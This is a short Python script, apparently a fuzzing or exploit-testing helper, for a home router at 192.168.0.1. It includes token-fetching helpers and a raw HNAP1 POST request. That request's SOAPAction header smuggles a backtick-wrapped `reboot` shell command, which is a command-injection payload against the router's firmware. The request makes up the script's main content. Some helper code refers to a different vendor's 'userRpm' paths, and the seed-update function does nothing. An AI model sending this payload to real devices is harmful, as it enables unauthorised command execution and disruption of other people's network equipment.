import requests
import re


def get_new_token(target_ip,target_port):
    burp0_url = "http://"+target_ip+":"+str(target_port)+"/authentication.cgi?captcha=&dummy=1673319347183"
    burp0_cookies = {"uid": "oIZXKZwJOS"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Referer": "http://192.168.0.1/"}

    results=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    results_str = results.text

    new_token = results_str[results_str.find('userRpm')-17:results_str.find('userRpm')-1]

    return new_token

def set_new_token(seed,new_token):
    seed_begin = seed[:seed.find('/')+1]
    seed_end = seed[seed.find('userRpm')-1:]
    updated_seed = seed_begin + new_token + seed_end
    return updated_seed

def update_seed(seed='',target_ip = '192.168.0.1',target_port = 80):
    updated_seed=seed
    #no need to update

    return updated_seed

if __name__ == '__main__':
    target_ip = '192.168.0.1'
    target_port = 80
    seed = '''POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1:80
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.27.1
SOAPAction: http://purenetworks.com/HNAP1/GetDeviceSettings/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`reboot`aaaaaaaaaaaaaaaaaaaaaa
Content-Type: text/xml
Cookie: uid=UUzkPysdIW
Content-Length: 3

ttt
'''
    updated_seed = update_seed(seed,target_ip,target_port)
    print(updated_seed)
